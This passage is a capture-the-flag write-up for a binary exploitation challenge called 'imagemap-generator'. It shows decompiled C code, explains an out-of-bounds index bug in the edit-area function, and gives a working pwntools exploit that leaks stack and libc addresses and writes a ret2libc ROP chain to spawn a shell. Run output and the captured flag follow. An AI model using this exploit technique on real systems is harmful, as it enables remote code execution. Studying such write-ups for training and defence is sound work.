+      *(_QWORD *)(544LL * i + a1 + 16),
+      *(_QWORD *)(544LL * i + a1 + 24),
+      (const char *)(544LL * i + a1 + 32),
+      (const char *)(544LL * i + a1 + 288));
+  printf("Enter area number to edit (1-%d): ", *a2);
+  __isoc99_scanf("%d", &v5);
+  getchar();
+  printf("Enter new x coordinate (current: %ld): ", *(_QWORD *)(544LL * --v5 + a1));
+  __isoc99_scanf("%ld", 544LL * v5 + a1);
+  printf("Enter new y coordinate (current: %ld): ", *(_QWORD *)(544LL * v5 + a1 + 8));
+  __isoc99_scanf("%ld", 544LL * v5 + a1 + 8);
+  printf("Enter new width (current: %ld): ", *(_QWORD *)(544LL * v5 + a1 + 16));
+  __isoc99_scanf("%ld", 544LL * v5 + a1 + 16);
+  printf("Enter new height (current: %ld): ", *(_QWORD *)(544LL * v5 + a1 + 24));
+  __isoc99_scanf("%ld", 544LL * v5 + a1 + 24);
+  getchar();
+  printf("Enter new redirect URL (current: %s): ", (const char *)(544LL * v5 + a1 + 32));
+  fgets((char *)(544LL * v5 + a1 + 32), 256, stdin);
+  v3 = 544LL * v5 + a1;
+  *(_BYTE *)(v3 + strcspn((const char *)(v3 + 32), "\n") + 32) = 0;
+  printf("Enter new title (current: %s): ", (const char *)(544LL * v5 + a1 + 288));
+  fgets((char *)(544LL * v5 + a1 + 288), 256, stdin);
+  v4 = 544LL * v5 + a1;
+  *(_BYTE *)(v4 + strcspn((const char *)(v4 + 288), "\n") + 288) = 0;
+  return puts("Area edited successfully!");
+}
+// 401120: using guessed type __int64 __isoc99_scanf(const char *, ...);
+
+//----- (0000000000401C72) ----------------------------------------------------
+int __fastcall generate_imagemap(__int64 a1, int a2, const char *a3)
+{
+  int i; // [rsp+2Ch] [rbp-4h]
+
+  puts("\n========== IMAGEMAP ==========");
+  puts("[imagemap]");
+  printf("%s", a3);
+  for ( i = 0; i < a2; ++i )
+    printf(
+      "%ld %ld %ld %ld %s %s\n",
+      *(_QWORD *)(544LL * i + a1),
+      *(_QWORD *)(544LL * i + a1 + 8),
+      *(_QWORD *)(544LL * i + a1 + 16),
+      *(_QWORD *)(544LL * i + a1 + 24),
+      (const char *)(544LL * i + a1 + 32),
+      (const char *)(544LL * i + a1 + 288));
+  puts("[/imagemap]");
+  return puts("==============================\n");
+}
+
+//----- (0000000000401DED) ----------------------------------------------------
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+8h] [rbp-2608h] BYREF
+  int v5; // [rsp+Ch] [rbp-2604h] BYREF
+  char v6[1536]; // [rsp+10h] [rbp-2600h] BYREF
+  char s[1024]; // [rsp+2210h] [rbp-400h] BYREF
+
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  puts("~-~-~ imagemap-generator ~-~-");
+  v5 = 0;
+  printf("Enter the image URL: ");
+  fgets(s, 1024, stdin);
+  do
+  {
+    puts("\nmenu:");
+    puts("1. create area");
+    puts("2. remove area");
+    puts("3. edit area");
+    puts("4. generate imagemap");
+    puts("5. exit");
+    printf("choice: ");
+    __isoc99_scanf("%d", &v4);
+    getchar();
+    switch ( v4 )
+    {
+      case 1:
+        create_area((__int64)v6, &v5);
+        break;
+      case 2:
+        remove_area((__int64)v6, &v5);
+        break;
+      case 3:
+        edit_area((__int64)v6, &v5);
+        break;
+      case 4:
+        generate_imagemap((__int64)v6, v5, s);
+        break;
+      case 5:
+        break;
+      default:
+        puts("Invalid choice.");
+        break;
+    }
+  }
+  while ( v4 != 5 );
+  return 0;
+}
+```
+
+Ok, so there is a vulnerability in `edit_area` where if we supply an out of bounds indices we can do an oob write with data. This is reliant on the size of the struct of the area data, but I'll edit it once i3 tells me more about it again. Additionally providing a negative index for edit_area will print out previous stack values, and we can leverage an index of -3 to get a libc leak.
+
+There is also a vulnerability in `create_area` where supplying "A" in x-coordinate and then doing `generate_beatmap` will output a stack leak. So we can use this to find location of RIP and calculate the OOB write there. Thankfully RIP does fit the constraints of the OOB write (will update later), so we can easily arb write to control RIP.
+
+Ok now that we have RIP control, and libc leak, we can write the basic system("/bin/sh") rop chain to RIP and get shell.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+exe = ELF("./generator_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.35.so")
+
+context.binary = exe
+
+# context.terminal = ['tmux', 'splitw', '-h']
+
+def conn():
+    if args.LOCAL:
+        r = process([exe.path])
+        # if args.DEBUG:
+        # gdb.attach(r, gdbscript="break *edit_area")
+        gdb.attach(r)
+    else:
+        r = remote("imagemap-generator.challs.sekai.team", 1337)
+
+    return r
+
+def create_area(r, x, y, width, height, url, title):
+    r.sendlineafter(b'choice: ', b'1')
+    r.sendlineafter(b'x coordinate: ', str(x).encode())
+    r.sendlineafter(b'y coordinate: ', str(y).encode())
+    r.sendlineafter(b'width: ', str(width).encode())
+    r.sendlineafter(b'height: ', str(height).encode())
+    r.sendlineafter(b'redirect URL: ', url)
+    r.sendlineafter(b'title: ', title)
+
+
+def edit_area(r, idx: bytes,  X: bytes, Y: bytes, width: bytes, height: bytes, redirect: bytes, title: bytes):
+    r.sendline(b"3") # edit area
+    r.sendline(idx) # areas + 3*0x220
+
+    r.sendline(X) # X
+    r.sendline(Y) # y
+    r.sendline(width) # width
+    r.sendline(height) # height
+    r.sendline(redirect) # redirect
+    r.sendline(title) # generate imagemap
+
+def edit_area_2(r, area_num):
+    """Edit an area and capture the leaked 'current' values"""
+    r.sendlineafter(b'choice: ', b'3')
+    r.sendlineafter(b'): ', str(area_num).encode())
+    
+    # Capture the leaked x coordinate
+    r.recvuntil(b'(current: ')
+    x_leak = int(r.recvuntil(b'):', drop=True))
+    r.sendline(str(x_leak).encode())
+    
+    # Capture the leaked y coordinate  
+    r.recvuntil(b'(current: ')
+    y_leak = int(r.recvuntil(b'):', drop=True))
+    r.sendline(str(y_leak).encode())
+    
+    # Capture the leaked width
+    r.recvuntil(b'(current: ')
+    width_leak = int(r.recvuntil(b'):', drop=True))
+    r.sendline(str(width_leak).encode())
+    
+    # Capture the leaked height
+    r.recvuntil(b'(current: ')
+    height_leak = int(r.recvuntil(b'):', drop=True))
+    r.sendline(str(height_leak).encode())
+    
+    # URL and title
+    r.recvuntil(b'(current: ')
+    r.sendline(b'dummy')
+    
+    r.recvuntil(b'(current: ')
+    r.sendline(b'dummy')
+    values = [x_leak, y_leak, width_leak, height_leak]
+    # values = [i for i in values]
+    # print(values)
+    return values
+
+
+def main():
+    r = conn()
+
+    r.sendline(b"X" * 512) # image url
+
+    # stack leak
+    r.sendline(b"1") # create area
+    r.sendline(f"A".encode()) # glitch
+    r.sendline(f"A".encode()) # 
+    r.sendline(b"4") # generate imagemap
+
+    stack_leak = r.recvuntil("[/imagemap]").splitlines()[-2].split()[0].decode()
+    print("stack_leak:", stack_leak)
+    stack_leak = int(stack_leak)
+    print("stack_leak (converted):", stack_leak)
+    print("stack_leak (hex):", hex(stack_leak))
+    
+    main_rbp = stack_leak
+
+    got_strcpy = exe.got["strcpy"]
+
+    # top of stack (HI)
+    saved_rip = main_rbp + 8 #RIP_width = 8
+    # ---- main rbp
+    image_url = main_rbp - 1024 #char[1024]
+    areas = image_url - 0x220 * 16 #AREA[16]
+    num_areas = areas - 4 #int
+    sel = num_areas - 4 #int
+
+    # this is true for some reason
+    rsp = sel-8
+
+    create_area(r, p64(exe.got['puts']), 0, 0, 0, b"0", b"0",)
+
+    leaks = edit_area_2(r,-3)
+
+    leaked = int(leaks[3])
+    print("leaked:", hex(leaked))
+
+    libc_addr = int(leaks[3]) - 0x21aaa0
+    libc.address = libc_addr
+    print("CALCUALTED LIBC:", hex(libc_addr))
+
+
+    # Method 1: Use pwntools ROP
+    libc_rop = ROP(libc)
+
+    # Get gadgets
+    pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
+    ret = libc_rop.find_gadget(['ret'])[0]
+
+    log.info(f"pop rdi (libc): {hex(pop_rdi)}")
+    log.info(f"ret (libc): {hex(ret)}")
+
+    # Get symbols
+    system = libc.symbols['system']
+    binsh = next(libc.search(b'/bin/sh\x00'))
+
+    log.info(f"system: {hex(system)}")
+    log.info(f"/bin/sh: {hex(binsh)}")
+
+    # ========== STAGE 2: ROP Chain with ONLY libc ==========
+
+    payload2 = flat([
+        ret, 
+        ret,        # Stack alignment (from libc)
+        pop_rdi,    # From libc
+        binsh,      # From libc
+        system      # From libc
+    ])
+
+    print(payload2)
+
+    edit_area(r,
+        idx=b"18",
+        X=b"1",
+        Y=b"1",
+        width=b"1",
+        height=b"1",
+        redirect=b"C",
+        title=
+        cyclic(92+100) + payload2
+        )
+
+    r.interactive()
+
+if __name__ == "__main__":
+    main()
+
+```
+```bash
+[+] Opening connection to imagemap-generator.challs.sekai.team on port 1337: Done
+/home/jake/osugaming/pwn_imagemap-generator/dist/test.py:93: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  stack_leak = r.recvuntil("[/imagemap]").splitlines()[-2].split()[0].decode()
+stack_leak: 140729468928016
+stack_leak (converted): 140729468928016
+stack_leak (hex): 0x7ffe22014010
+leaked: 0x7cf75189eaa0
+CALCUALTED LIBC: 0x7cf751684000
+[*] Loaded 219 cached gadgets for './libc.so.6'
+[*] pop rdi (libc): 0x7cf7516ae3e5
+[*] ret (libc): 0x7cf7516ad139
+[*] system: 0x7cf7516d4d70
+[*] /bin/sh: 0x7cf75185c678
+b'9\xd1jQ\xf7|\x00\x009\xd1jQ\xf7|\x00\x00\xe5\xe3jQ\xf7|\x00\x00x\xc6\x85Q\xf7|\x00\x00pMmQ\xf7|\x00\x00'
+[*] Switching to interactive mode
+): Area edited successfully!
+
+menu:
+1. create area
+2. remove area
+3. edit area
+4. generate imagemap
+5. exit
+choice: Current areas:
+  1. [140729468928016,0 140729468928016x0]  - A
+  2. [140729468928016,0 140729468928016x0] ' P@\x00\x00\x00\x00\x00' - 0
+Enter area number to edit (1-2): Enter new x coordinate (current: 0): Enter new y coordinate (current: 0): Enter new width (current: 0): Enter new height (current: 0): Enter new redirect URL (current: ): Enter new title (current: ): Area edited successfully!
+
+menu:
+1. create area
+2. remove area
+3. edit area
+4. generate imagemap
+5. exit
+choice: $ 5
+$ ls
+flag.txt
+run
+$ ls -al
+total 36
+drwxr-xr-x  2 nobody nogroup  4096 Oct 25 01:27 .
+drwxr-xr-x 18 nobody nogroup  4096 Oct 25 01:27 ..
+-rw-r--r--  1 nobody nogroup    31 Oct 25 01:26 flag.txt
+-rwxr-xr-x  1 nobody nogroup 20592 Oct 25 01:26 run
+$ whoami
+$ cat flag
+$ cat flag.txt
+osu{i_st1ll_d0nt_get_imagemaps}$
+```
+
+Flag: `osu{i_st1ll_d0nt_get_imagemaps}`
+
+
+# Foreward
+
+I think during my time moving forward I will probably try to do more pwn challs + practice. Lowkey its fun (more fun than web tbh). Finally making contributions to PPP lets goooo! Will demo these on friday during general meeting :cat:!
